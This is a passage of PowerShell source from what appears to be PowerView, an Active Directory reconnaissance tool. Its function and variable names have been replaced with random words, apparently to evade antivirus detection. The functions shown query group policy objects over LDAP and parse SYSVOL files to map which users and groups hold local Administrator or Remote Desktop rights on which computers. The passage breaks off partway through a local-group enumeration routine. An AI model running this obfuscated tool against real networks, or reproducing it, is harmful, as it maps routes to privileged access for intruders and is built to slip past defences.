                $bjrWoTvw99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $PPosolen99['SearchBase'] = $_
                    $PPosolen99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    farrowing @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $afFJXkRc99 = ''
                $kXbEpVCq99 = ''
                $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                    $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($QghnbJOP99 -match 'LDAP://|^CN=.*') {
                        $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[roomfuls] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                            $PPosolen99['Domain'] = $BvhyhWZG99
                            $GDUlOJMy99 = watersides @SearcherArguments
                            if (-not $GDUlOJMy99) {
                                Write-Warning "[roomfuls] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                            }
                        }
                    }
                    elseif ($QghnbJOP99 -match '{.*}') {
                        $afFJXkRc99 += "(name=$QghnbJOP99)"
                    }
                    else {
                        try {
                            $DwsqqDxI99 = (-Join (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                        }
                        catch {
                            $afFJXkRc99 += "(displayname=$QghnbJOP99)"
                        }
                    }
                }
                if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                    $kXbEpVCq99 += "(|$afFJXkRc99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[roomfuls] Using additional LDAP filter: $HOOTOEqu99"
                    $kXbEpVCq99 += "$HOOTOEqu99"
                }
                $GDUlOJMy99.filter = "(&(objectCategory=groupPolicyContainer)$kXbEpVCq99)"
                Write-Verbose "[roomfuls] filter string: $($GDUlOJMy99.filter)"
                if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $GDUlOJMy99.FindOne() }
                else { $pfqXXMQd99 = $GDUlOJMy99.FindAll() }
                $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($FNgTGwmR99 -Match '^GC://')) {
                            $GPO = Buddy -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $RaMlsWUB99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $SONHImbN99 = "\\$RaMlsWUB99\SysVol\$RaMlsWUB99\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $SONHImbN99
                            }
                            catch {
                                Write-Verbose "[roomfuls] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Buddy -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($pfqXXMQd99) {
                    try { $pfqXXMQd99.dispose() }
                    catch {
                        Write-Verbose "[roomfuls] Error disposing of the Results object: $_"
                    }
                }
                $GDUlOJMy99.dispose()
            }
        }
    }
}
function factoring {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $BfpbWwpi99,
        [Switch]
        $tOlpaNBs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $SSNUOPgW99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $gshqUOUz99 = @{}
        if ($PSBoundParameters['Domain']) { $gshqUOUz99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Server']) { $gshqUOUz99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['Credential']) { $gshqUOUz99['Credential'] = $gxazvivN99 }
        $NHkmSGFw99 = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
        roomfuls @SearcherArguments | ForEach-Object {
            $swqoxVyH99 = $_.displayname
            $cgXwtZoc99 = $_.name
            $ZBoaNOpR99 = $_.gpcfilesyspath
            $cqtcZjht99 =  @{ 'GptTmplPath' = "$ZBoaNOpR99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $cqtcZjht99['Credential'] = $gxazvivN99 }
            $Inf = Tuscon @ParseArgs
            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $VLqljbSI99 = @{}
                ForEach ($AjSokHtI99 in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $UpuwtwlL99 = $AjSokHtI99.Key.Split('__', $NHkmSGFw99) | ForEach-Object {$_.Trim()}
                    $BmpsASpP99 = $AjSokHtI99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        $RcFXGpYz99 = @()
                        ForEach ($cgTuSBdj99 in $BmpsASpP99) {
                            if ($cgTuSBdj99 -and ($cgTuSBdj99.Trim() -ne '')) {
                                if ($cgTuSBdj99 -notmatch '^S-1-.*') {
                                    $AimEeBqa99 = @{'ObjectName' = $cgTuSBdj99}
                                    if ($PSBoundParameters['Domain']) { $AimEeBqa99['Domain'] = $SSNUOPgW99 }
                                    $TBSJNJUH99 = gain @ConvertToArguments
                                    if ($TBSJNJUH99) {
                                        $RcFXGpYz99 += $TBSJNJUH99
                                    }
                                    else {
                                        $RcFXGpYz99 += $cgTuSBdj99
                                    }
                                }
                                else {
                                    $RcFXGpYz99 += $cgTuSBdj99
                                }
                            }
                        }
                        $BmpsASpP99 = $RcFXGpYz99
                    }
                    if (-not $VLqljbSI99[$Group]) {
                        $VLqljbSI99[$Group] = @{}
                    }
                    if ($BmpsASpP99 -isnot [System.Array]) {$BmpsASpP99 = @($BmpsASpP99)}
                    $VLqljbSI99[$Group].Add($UpuwtwlL99, $BmpsASpP99)
                }
                ForEach ($AjSokHtI99 in $VLqljbSI99.GetEnumerator()) {
                    if ($AjSokHtI99 -and $AjSokHtI99.Key -and ($AjSokHtI99.Key -match '^\*')) {
                        $LmXmVdGr99 = $AjSokHtI99.Key.Trim('*')
                        if ($LmXmVdGr99 -and ($LmXmVdGr99.Trim() -ne '')) {
                            $SZjbzmKX99 = woodmen -ObjectSID $LmXmVdGr99 @ConvertArguments
                        }
                        else {
                            $SZjbzmKX99 = $False
                        }
                    }
                    else {
                        $SZjbzmKX99 = $AjSokHtI99.Key
                        if ($SZjbzmKX99 -and ($SZjbzmKX99.Trim() -ne '')) {
                            if ($SZjbzmKX99 -match 'Administrators') {
                                $LmXmVdGr99 = 'S-1-5-32-544'
                            }
                            elseif ($SZjbzmKX99 -match 'Remote Desktop') {
                                $LmXmVdGr99 = 'S-1-5-32-555'
                            }
                            elseif ($SZjbzmKX99 -match 'Guests') {
                                $LmXmVdGr99 = 'S-1-5-32-546'
                            }
                            elseif ($SZjbzmKX99.Trim() -ne '') {
                                $AimEeBqa99 = @{'ObjectName' = $SZjbzmKX99}
                                if ($PSBoundParameters['Domain']) { $AimEeBqa99['Domain'] = $SSNUOPgW99 }
                                $LmXmVdGr99 = gain @ConvertToArguments
                            }
                            else {
                                $LmXmVdGr99 = $Null
                            }
                        }
                    }
                    $FRFDIlam99 = New-Object PSObject
                    $FRFDIlam99 | Add-Member Noteproperty 'GPODisplayName' $swqoxVyH99
                    $FRFDIlam99 | Add-Member Noteproperty 'GPOName' $cgXwtZoc99
                    $FRFDIlam99 | Add-Member Noteproperty 'GPOPath' $ZBoaNOpR99
                    $FRFDIlam99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $FRFDIlam99 | Add-Member Noteproperty 'Filters' $Null
                    $FRFDIlam99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
                    $FRFDIlam99 | Add-Member Noteproperty 'GroupSID' $LmXmVdGr99
                    $FRFDIlam99 | Add-Member Noteproperty 'GroupMemberOf' $AjSokHtI99.Value.Memberof
                    $FRFDIlam99 | Add-Member Noteproperty 'GroupMembers' $AjSokHtI99.Value.Members
                    $FRFDIlam99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $FRFDIlam99
                }
            }
            $cqtcZjht99 =  @{
                'GroupsXMLpath' = "$ZBoaNOpR99\MACHINE\Preferences\Groups\Groups.xml"
            }
            Peiping @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $RcFXGpYz99 = @()
                    ForEach ($cgTuSBdj99 in $_.GroupMembers) {
                        if ($cgTuSBdj99 -and ($cgTuSBdj99.Trim() -ne '')) {
                            if ($cgTuSBdj99 -notmatch '^S-1-.*') {
                                $AimEeBqa99 = @{'ObjectName' = $SZjbzmKX99}
                                if ($PSBoundParameters['Domain']) { $AimEeBqa99['Domain'] = $SSNUOPgW99 }
                                $TBSJNJUH99 = gain -Domain $SSNUOPgW99 -ObjectName $cgTuSBdj99
                                if ($TBSJNJUH99) {
                                    $RcFXGpYz99 += $TBSJNJUH99
                                }
                                else {
                                    $RcFXGpYz99 += $cgTuSBdj99
                                }
                            }
                            else {
                                $RcFXGpYz99 += $cgTuSBdj99
                            }
                        }
                    }
                    $_.GroupMembers = $RcFXGpYz99
                }
                $_ | Add-Member Noteproperty 'GPODisplayName' $swqoxVyH99
                $_ | Add-Member Noteproperty 'GPOName' $cgXwtZoc99
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}
function designation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $BfpbWwpi99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $KqYbWZot99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $vGdTAAdQ99 = @{}
        if ($PSBoundParameters['Domain']) { $vGdTAAdQ99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Server']) { $vGdTAAdQ99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $vGdTAAdQ99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $vGdTAAdQ99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $vGdTAAdQ99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $vGdTAAdQ99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $vGdTAAdQ99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        $eazkeAOH99 = @()
        if ($PSBoundParameters['Identity']) {
            $eazkeAOH99 += farrowing @CommonArguments -Identity $BfpbWwpi99 | Select-Object -Expand objectsid
            $vekcVKXH99 = $eazkeAOH99
            if (-not $eazkeAOH99) {
                Throw "[designation] Unable to retrieve SID for identity '$BfpbWwpi99'"
            }
        }
        else {
            $eazkeAOH99 = @('*')
        }
        if ($KqYbWZot99 -match 'S-1-5') {
            $vwTHvrOJ99 = $KqYbWZot99
        }
        elseif ($KqYbWZot99 -match 'Admin') {
            $vwTHvrOJ99 = 'S-1-5-32-544'
        }
        else {
            $vwTHvrOJ99 = 'S-1-5-32-555'
        }
        if ($eazkeAOH99[0] -ne '*') {
            ForEach ($pZtebdhW99 in $eazkeAOH99) {
                Write-Verbose "[designation] Enumerating nested group memberships for: '$pZtebdhW99'"
                $eazkeAOH99 += burlap @CommonArguments -Properties 'objectsid' -MemberIdentity $pZtebdhW99 | Select-Object -ExpandProperty objectsid
            }
        }
        Write-Verbose "[designation] Target localgroup SID: $vwTHvrOJ99"
        Write-Verbose "[designation] Effective target domain SIDs: $eazkeAOH99"
        $WuaiWkno99 = factoring @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $FRFDIlam99 = $_
            if ($FRFDIlam99.GroupSID -match $vwTHvrOJ99) {
                $FRFDIlam99.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($eazkeAOH99[0] -eq '*') -or ($eazkeAOH99 -Contains $_) ) {
                        $FRFDIlam99
                    }
                }
            }
            if ( ($FRFDIlam99.GroupMemberOf -contains $vwTHvrOJ99) ) {
                if ( ($eazkeAOH99[0] -eq '*') -or ($eazkeAOH99 -Contains $FRFDIlam99.GroupSID) ) {
                    $FRFDIlam99
                }
            }
        } | Sort-Object -Property GPOName -Unique
        $WuaiWkno99 | Where-Object {$_} | ForEach-Object {
            $cgXwtZoc99 = $_.GPODisplayName
            $TWUVwajs99 = $_.GPOName
            $ZBoaNOpR99 = $_.GPOPath
            $cAdOiDjf99 = $_.GPOType
            if ($_.GroupMembers) {
                $xRbqrVMy99 = $_.GroupMembers
            }
            else {
                $xRbqrVMy99 = $_.GroupSID
            }
            $kqlIQisk99 = $_.Filters
            if ($eazkeAOH99[0] -eq '*') {
                $vwSTTfSi99 = $xRbqrVMy99
            }
            else {
                $vwSTTfSi99 = $vekcVKXH99
            }
            ivies @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $TWUVwajs99 | ForEach-Object {
                if ($kqlIQisk99) {
                    $OCMjMDrx99 = doubtlessly @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($kqlIQisk99.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $OCMjMDrx99 = doubtlessly @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if ($OCMjMDrx99) {
                    if ($OCMjMDrx99 -isnot [System.Array]) {$OCMjMDrx99 = @($OCMjMDrx99)}
                    ForEach ($pZtebdhW99 in $vwSTTfSi99) {
                        $Object = farrowing @CommonArguments -Identity $pZtebdhW99 -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
                        $sYCvPfIx99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $oYwckWdc99 = New-Object PSObject
                        $oYwckWdc99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $oYwckWdc99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $oYwckWdc99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $oYwckWdc99 | Add-Member Noteproperty 'Domain' $SSNUOPgW99
                        $oYwckWdc99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
                        $oYwckWdc99 | Add-Member Noteproperty 'GPODisplayName' $cgXwtZoc99
                        $oYwckWdc99 | Add-Member Noteproperty 'GPOGuid' $TWUVwajs99
                        $oYwckWdc99 | Add-Member Noteproperty 'GPOPath' $ZBoaNOpR99
                        $oYwckWdc99 | Add-Member Noteproperty 'GPOType' $cAdOiDjf99
                        $oYwckWdc99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $oYwckWdc99 | Add-Member Noteproperty 'ComputerName' $OCMjMDrx99
                        $oYwckWdc99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $oYwckWdc99
                    }
                }
            }
            shoddiness @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $TWUVwajs99 | ForEach-Object {
                ForEach ($pZtebdhW99 in $vwSTTfSi99) {
                    $Object = farrowing @CommonArguments -Identity $pZtebdhW99 -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
                    $sYCvPfIx99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                    $oYwckWdc99 = New-Object PSObject
                    $oYwckWdc99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $oYwckWdc99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $oYwckWdc99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $oYwckWdc99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
                    $oYwckWdc99 | Add-Member Noteproperty 'Domain' $SSNUOPgW99
                    $oYwckWdc99 | Add-Member Noteproperty 'GPODisplayName' $cgXwtZoc99
                    $oYwckWdc99 | Add-Member Noteproperty 'GPOGuid' $TWUVwajs99
                    $oYwckWdc99 | Add-Member Noteproperty 'GPOPath' $ZBoaNOpR99
                    $oYwckWdc99 | Add-Member Noteproperty 'GPOType' $cAdOiDjf99
                    $oYwckWdc99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $oYwckWdc99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $oYwckWdc99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $oYwckWdc99
                }
            }
        }
    }
}
function mohair {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $HdCnajIa99,
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $CbxTpJvM99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $KqYbWZot99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $vGdTAAdQ99 = @{}
        if ($PSBoundParameters['Domain']) { $vGdTAAdQ99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Server']) { $vGdTAAdQ99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $vGdTAAdQ99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $vGdTAAdQ99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $vGdTAAdQ99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $vGdTAAdQ99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $vGdTAAdQ99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $bECDGFKr99 = doubtlessly @CommonArguments -Identity $HdCnajIa99 -Properties 'distinguishedname,dnshostname'
            if (-not $bECDGFKr99) {
                throw "[mohair] Computer $HdCnajIa99 not found. Try a fully qualified host name."
            }
            ForEach ($cXOPCAwl99 in $bECDGFKr99) {
                $kPEeiRAC99 = @()
                $DN = $cXOPCAwl99.distinguishedname
                $sIFBMDeb99 = $DN.IndexOf('OU=')
                if ($sIFBMDeb99 -gt 0) {
                    $SARTvoSC99 = $DN.SubString($sIFBMDeb99)
                }
                if ($SARTvoSC99) {
                    $kPEeiRAC99 += ivies @CommonArguments -SearchBase $SARTvoSC99 -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $($cXOPCAwl99.dnshostname)"
                $UFJqwyIQ99 = (tussled -ComputerName $cXOPCAwl99.dnshostname).SiteName
                if ($UFJqwyIQ99 -and ($UFJqwyIQ99 -notmatch 'Error')) {
                    $kPEeiRAC99 += shoddiness @CommonArguments -Identity $UFJqwyIQ99 -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                $kPEeiRAC99 | factoring @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $FRFDIlam99 = $_
                    if($FRFDIlam99.GroupMembers) {
                        $xRbqrVMy99 = $FRFDIlam99.GroupMembers
                    }
                    else {
                        $xRbqrVMy99 = $FRFDIlam99.GroupSID
                    }
                    $xRbqrVMy99 | ForEach-Object {
                        $Object = farrowing @CommonArguments -Identity $_
                        $sYCvPfIx99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $wUzbRbYR99 = New-Object PSObject
                        $wUzbRbYR99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99.dnshostname
                        $wUzbRbYR99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $wUzbRbYR99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $wUzbRbYR99 | Add-Member Noteproperty 'ObjectSID' $_
                        $wUzbRbYR99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
                        $wUzbRbYR99 | Add-Member Noteproperty 'GPODisplayName' $FRFDIlam99.GPODisplayName
                        $wUzbRbYR99 | Add-Member Noteproperty 'GPOGuid' $FRFDIlam99.GPOName
                        $wUzbRbYR99 | Add-Member Noteproperty 'GPOPath' $FRFDIlam99.GPOPath
                        $wUzbRbYR99 | Add-Member Noteproperty 'GPOType' $FRFDIlam99.GPOType
                        $wUzbRbYR99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $wUzbRbYR99
                    }
                }
            }
        }
    }
}
function monograms {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $SFBkuPBO99 = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $gshqUOUz99 = @{}
        if ($PSBoundParameters['Server']) { $gshqUOUz99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['Credential']) { $gshqUOUz99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $PPosolen99['Domain'] = $SSNUOPgW99
            $gshqUOUz99['Domain'] = $SSNUOPgW99
        }
        if ($SFBkuPBO99 -eq 'All') {
            $PPosolen99['Identity'] = '*'
        }
        elseif ($SFBkuPBO99 -eq 'Domain') {
            $PPosolen99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($SFBkuPBO99 -eq 'DomainController') -or ($SFBkuPBO99 -eq 'DC')) {
            $PPosolen99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $PPosolen99['Identity'] = $SFBkuPBO99
        }
        $KVGbINsU99 = roomfuls @SearcherArguments
        ForEach ($GPO in $KVGbINsU99) {
            $CnoFYxhs99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            $cqtcZjht99 =  @{
                'GptTmplPath' = $CnoFYxhs99
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $cqtcZjht99['Credential'] = $gxazvivN99 }
            Tuscon @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}
function Wheaties {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = $Env:COMPUTERNAME,
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $AlrHOHqQ99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            if ($AlrHOHqQ99 -eq 'API') {
                $TNhhTnXZ99 = 1
                $TuHFtCTR99 = [IntPtr]::Zero
                $FHpQkwbc99 = 0
                $wWzmonqN99 = 0
                $rVQOkgHx99 = 0
                $fYOedlSN99 = $eIekXKWj99::NetLocalGroupEnum($cXOPCAwl99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
                $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
